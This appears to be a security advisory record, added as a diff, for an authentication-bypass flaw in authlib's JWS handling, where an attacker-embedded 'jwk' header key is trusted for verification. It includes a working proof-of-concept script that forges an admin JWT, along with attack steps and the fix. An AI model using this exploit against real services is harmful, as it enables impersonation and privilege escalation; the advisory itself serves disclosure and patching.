@@ -1,0 +1,112 @@
+{
+  "id": "GHSA-wvwj-cvrp-7pv5",
+  "modified": "2026-03-16T15:31:40.150244Z",
+  "published": "2026-03-16T15:17:15Z",
+  "aliases": [
+    "CVE-2026-27962"
+  ],
+  "summary": "Authlib JWS JWK Header Injection: Signature Verification Bypass",
+  "details": "## Description\n\n### Summary\n\nA JWK Header Injection vulnerability in `authlib`'s JWS implementation allows an unauthenticated\nattacker to forge arbitrary JWT tokens that pass signature verification. When `key=None` is passed\nto any JWS deserialization function, the library extracts and uses the cryptographic key embedded\nin the attacker-controlled JWT `jwk` header field. An attacker can sign a token with their own\nprivate key, embed the matching public key in the header, and have the server accept the forged\ntoken as cryptographically valid — bypassing authentication and authorization entirely.\n\nThis behavior violates **RFC 7515 §4.1.3** and the validation algorithm defined in **RFC 7515 §5.2**.\n\n### Details\n\n**Vulnerable file:** `authlib/jose/rfc7515/jws.py`  \n**Vulnerable method:** `JsonWebSignature._prepare_algorithm_key()`  \n**Lines:** 272–273\n\n```python\nelif key is None and \"jwk\" in header:\n    key = header[\"jwk\"]   # ← attacker-controlled key used for verification\n```\n\nWhen `key=None` is passed to `jws.deserialize_compact()`, `jws.deserialize_json()`, or\n`jws.deserialize()`, the library checks the JWT header for a `jwk` field. If present, it extracts\nthat value — which is fully attacker-controlled — and uses it as the verification key.\n\n**RFC 7515 violations:**\n\n- **§4.1.3** explicitly states the `jwk` header parameter is **\"NOT RECOMMENDED\"** because keys\n  embedded by the token submitter cannot be trusted as a verification anchor.\n- **§5.2 (Validation Algorithm)** specifies the verification key MUST come from the *application\n  context*, not from the token itself. There is no step in the RFC that permits falling back to\n  the `jwk` header when no application key is provided.\n\n**Why this is a library issue, not just a developer mistake:**\n\nThe most common real-world trigger is a **key resolver callable** used for JWKS-based key lookup.\nA developer writes:\n\n```python\ndef lookup_key(header, payload):\n    kid = header.get(\"kid\")\n    return jwks_cache.get(kid)   # returns None when kid is unknown/rotated\n\njws.deserialize_compact(token, lookup_key)\n```\n\nWhen an attacker submits a token with an unknown `kid`, the callable legitimately returns `None`.\nThe library then silently falls through to `key = header[\"jwk\"]`, trusting the attacker's embedded\nkey. The developer never wrote `key=None` — the library's fallback logic introduced it. The result\nlooks like a verified token with no exception raised, making the substitution invisible.\n\n**Attack steps:**\n\n1. Attacker generates an RSA or EC keypair.\n2. Attacker crafts a JWT payload with any desired claims (e.g. `{\"role\": \"admin\"}`).\n3. Attacker signs the JWT with their **private** key.\n4. Attacker embeds their **public** key in the JWT `jwk` header field.\n5. Attacker uses an unknown `kid` to cause the key resolver to return `None`.\n6. The library uses `header[\"jwk\"]` for verification — signature passes.\n7. Forged claims are returned as authentic.\n\n### PoC\n\nTested against **authlib 1.6.6** (HEAD `a9e4cfee`, Python 3.11).\n\n**Requirements:**\n```\npip install authlib cryptography\n```\n\n**Exploit script:**\n```python\nfrom authlib.jose import JsonWebSignature, RSAKey\nimport json\n\njws = JsonWebSignature([\"RS256\"])\n\n# Step 1: Attacker generates their own RSA keypair\nattacker_private = RSAKey.generate_key(2048, is_private=True)\nattacker_public_jwk = attacker_private.as_dict(is_private=False)\n\n# Step 2: Forge a JWT with elevated privileges, embed public key in header\nheader = {\"alg\": \"RS256\", \"jwk\": attacker_public_jwk}\nforged_payload = json.dumps({\"sub\": \"attacker\", \"role\": \"admin\"}).encode()\nforged_token = jws.serialize_compact(header, forged_payload, attacker_private)\n\n# Step 3: Server decodes with key=None — token is accepted\nresult = jws.deserialize_compact(forged_token, None)\nclaims = json.loads(result[\"payload\"])\nprint(claims)  # {'sub': 'attacker', 'role': 'admin'}\nassert claims[\"role\"] == \"admin\"  # PASSES\n```\n\n**Expected output:**\n```\n{'sub': 'attacker', 'role': 'admin'}\n```\n\n**Docker (self-contained reproduction):**\n```bash\nsudo docker run --rm authlib-cve-poc:latest \\\n  python3 /workspace/pocs/poc_auth001_jws_jwk_injection.py\n```\n\n### Impact\n\nThis is an authentication and authorization bypass vulnerability. Any application using authlib's\nJWS deserialization is affected when:\n\n- `key=None` is passed directly, **or**\n- a key resolver callable returns `None` for unknown/rotated `kid` values (the common JWKS lookup pattern)\n\nAn unauthenticated attacker can impersonate any user or assume any privilege encoded in JWT claims\n(admin roles, scopes, user IDs) without possessing any legitimate credentials or server-side keys.\nThe forged token is indistinguishable from a legitimate one — no exception is raised.\n\nThis is a violation of **RFC 7515 §4.1.3** and **§5.2**. The spec is unambiguous: the `jwk`\nheader parameter is \"NOT RECOMMENDED\" as a key source, and the validation key MUST come from\nthe application context, not the token itself.\n\n**Minimal fix** — remove the fallback from `authlib/jose/rfc7515/jws.py:272-273`:\n```python\n# DELETE:\nelif key is None and \"jwk\" in header:\n    key = header[\"jwk\"]\n```\n\n**Recommended safe replacement** — raise explicitly when no key is resolved:\n```python\nif key is None:\n    raise MissingKeyError(\"No key provided and no valid key resolvable from context.\")\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "authlib",
+        "purl": "pkg:pypi/authlib"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.6.9"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1",
+        "0.10",
+        "0.11",
+        "0.12",
+        "0.12.1",
+        "0.13",
+        "0.14",
+        "0.14.1",
+        "0.14.2",
+        "0.14.3",
+        "0.15",
+        "0.15.1",
+        "0.15.2",
+        "0.15.3",
+        "0.15.4",
+        "0.15.5",
+        "0.15.6",
+        "0.1rc0",
+        "0.2",
+        "0.2.1",
+        "0.3",
+        "0.4",
+        "0.4.1",
+        "0.5",
+        "0.5.1",
+        "0.6",
+        "0.7",
+        "0.8",
+        "0.9",
+        "1.0.0",
+        "1.0.0a1",
+        "1.0.0a2",
+        "1.0.0b1",
+        "1.0.0b2",
+        "1.0.0rc1",
+        "1.0.1",
+        "1.1.0",
+        "1.2.0",
+        "1.2.1",
+        "1.3.0",
+        "1.3.1",
+        "1.3.2",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.6.0",
+        "1.6.1",
+        "1.6.2",
+        "1.6.3",
+        "1.6.4",
+        "1.6.5",
+        "1.6.6",
+        "1.6.7",
+        "1.6.8"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.6.8",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-wvwj-cvrp-7pv5/GHSA-wvwj-cvrp-7pv5.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/security/advisories/GHSA-wvwj-cvrp-7pv5"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/commit/a5d4b2d4c9e46bfa11c82f85fdc2bcc0b50ae681"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/authlib/authlib"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/releases/tag/v1.6.9"
+    }
+  ]
+}
